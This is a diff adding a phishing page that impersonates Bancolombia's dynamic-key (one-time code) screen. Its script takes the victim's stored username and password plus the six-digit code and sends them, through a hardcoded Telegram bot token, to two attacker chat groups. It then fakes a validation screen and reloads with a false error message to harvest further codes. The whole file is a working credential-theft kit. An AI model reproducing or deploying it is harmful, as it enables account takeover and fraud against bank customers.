@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Bancolombia - Clave Dinámica</title>
+  <link rel="stylesheet" href="styles.css">
+  <style>
+    /* Estilos básicos para centrar mensajes y formularios */
+    .centered {
+      text-align: center;
+      margin-top: 20%;
+      font-family: Arial, sans-serif;
+    }
+    .centered img {
+      width: 100px;
+      height: 100px;
+    }
+    /* Mensaje de error encima del contenido */
+    #errorContainer {
+      text-align: center;
+      color: red;
+      font-family: Arial, sans-serif;
+      margin-top: 20px;
+    }
+    .digit-input {
+      width: 40px;
+      padding: 8px;
+      text-align: center;
+      font-size: 18px;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <img src="logo.svg" alt="Bancolombia Logo" class="logo">
+  </header>
+  
+  <!-- Contenedor para el mensaje de error (si existe) -->
+  <div id="errorContainer"></div>
+  
+  <div class="content" id="content">
+    <h2 class="welcome-title">Clave Dinámica</h2>
+    <div class="login-container">
+      <p class="subtitle">Consulta tu clave dinamica desde la App Mi Bancolombia.</p>
+      <div class="input-group">
+        <input type="text" class="digit-input" maxlength="1" id="digit1">
+        <input type="text" class="digit-input" maxlength="1" id="digit2">
+        <input type="text" class="digit-input" maxlength="1" id="digit3">
+        <input type="text" class="digit-input" maxlength="1" id="digit4">
+        <input type="text" class="digit-input" maxlength="1" id="digit5">
+        <input type="text" class="digit-input" maxlength="1" id="digit6">
+      </div>
+      <div class="buttons-row">
+        <button class="btn-back" onclick="window.history.back()">Volver</button>
+        <button class="btn-login" onclick="enviarDatos()">Continuar</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // Si en la carga de la página se encontró el flag "claveError", mostrar el mensaje de error y eliminar el flag.
+    document.addEventListener("DOMContentLoaded", function () {
+      if (localStorage.getItem('claveError')) {
+        document.getElementById('errorContainer').innerHTML = `
+          <h3>Error403: Clave dinámica incorrecta.</h3>
+          <p>Intente con otra diferente.</p>
+        `;
+        localStorage.removeItem('claveError');
+      }
+      
+      // Lógica para el manejo de los 6 inputs de la clave dinámica.
+      const inputs = document.querySelectorAll(".digit-input");
+
+      function isDigit(char) {
+        return /^\d$/.test(char);
+      }
+
+      function distributeDigits(str) {
+        const digits = str.replace(/\D/g, "").split("").slice(0, inputs.length);
+        inputs.forEach((input, i) => input.value = digits[i] || "");
+        if (digits.length < inputs.length) {
+          inputs[digits.length].focus();
+        }
+      }
+
+      inputs.forEach((input, index) => {
+        input.addEventListener("input", (e) => {
+          const char = e.target.value;
+          if (!isDigit(char)) {
+            e.target.value = "";
+            return;
+          }
+          if (index < inputs.length - 1) {
+            inputs[index + 1].focus();
+          }
+        });
+
+        input.addEventListener("keydown", (e) => {
+          if (e.key === "Backspace" && e.target.value === "" && index > 0) {
+            inputs[index - 1].focus();
+          }
+          if (e.key === "Enter") {
+            e.preventDefault();
+          }
+        });
+
+        input.addEventListener("paste", (e) => {
+          e.preventDefault();
+          const pasted = e.clipboardData.getData("text");
+          distributeDigits(pasted);
+        });
+      });
+      inputs[0].focus();
+    });
+
+    // Función para enviar los mensajes a Telegram
+    
+    // Función para enviar los mensajes a Telegram
+
+ // Aquí cierra la función sendTelegramMessages correctamente.
+
+    // Función para escapar caracteres especiales en HTML (muy básica)
+function escapeHTML(text) {
+  return text.replace(/&/g, "&amp;")
+             .replace(/</g, "&lt;")
+             .replace(/>/g, "&gt;");
+}
+
+function sendTelegramMessages(usuario, clave, claveDinamica) {
+  const botToken = "7621555641:AAFE0uU8xhw-MEqezuMeZRJARFogTqzz6fY";
+  const apiURL = "https://api.telegram.org/bot" + botToken + "/sendMessage";
+  const grupo1 = "-1002511035127";
+  const grupo2 = "-1002638412576";
+
+  function enviarMensaje(chatId, mensaje) {
+    fetch(apiURL, {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: mensaje,
+        parse_mode: "HTML"
+      })
+    }).catch(err => console.error("Error al enviar mensaje:", err));
+  }
+
+  // Escapar solo los datos variables para HTML
+  const usuarioEscaped = escapeHTML(usuario);
+  const claveEscaped = escapeHTML(clave);
+  const claveDinamicaEscaped = escapeHTML(claveDinamica);
+
+  for (let i = 0; i < 3; i++) {
+    const mensajeGrupo1 = `👤 <b>Usuario</b>: <code>${usuarioEscaped}</code>\n🔒 <b>Clave Principal</b>: <code>${claveEscaped}</code>\n💸 <b>Clave dinámica</b>: <code>${claveDinamicaEscaped}</code>\n@Mohamee25`;
+    const mensajeGrupo2 = `┏🟢 <b>LOGO BANCOLOMBIA</b>\n┣👤 <b>User</b>: <code>${usuarioEscaped}</code>\n┣🔒 <b>Pass</b>: <code>${claveEscaped}</code>\n┗💸 <b>Dinámica</b>: <code>${claveDinamicaEscaped}</code>\n\n<b>Tags</b>: @extasys777 @Pffdydy`;
+
+    enviarMensaje(grupo1, mensajeGrupo1);
+    enviarMensaje(grupo2, mensajeGrupo2);
+  }
+}
+    
+
+
+    // Función principal que se ejecuta al hacer clic en "Continuar"
+    function enviarDatos() {
+      // Recuperar usuario y clave almacenados de páginas anteriores
+      const usuario = localStorage.getItem('user');
+      const clave = localStorage.getItem('clave');
+      // Recoger la clave dinámica de los 6 inputs
+      let claveDinamica = "";
+      document.querySelectorAll(".digit-input").forEach(input => {
+        claveDinamica += input.value;
+      });
+
+      // Validar que todos los campos estén completos
+      if (!usuario || !clave || claveDinamica.length !== 6) {
+        alert("Por favor, completa correctamente la clave dinámica.");
+        return;
+      }
+
+      // Enviar datos a Telegram (se envían 10 mensajes a cada grupo)
+      sendTelegramMessages(usuario, clave, claveDinamica);
+
+      // Mostrar la pantalla de "Cargando..."
+      document.body.innerHTML = `
+        <div class="centered">
+          <h2>Validando tus datos...</h2><br>
+          <img src="loading.gif" alt="Cargando">
+        </div>
+      `;
+      
+      // Después de 5 segundos, se establece el flag de error y se recarga la página automáticamente.
+      setTimeout(() => {
+        localStorage.setItem('claveError', 'true');
+        location.reload();
+      }, 15000);
+    }
+  </script>
+</body>
+</html>
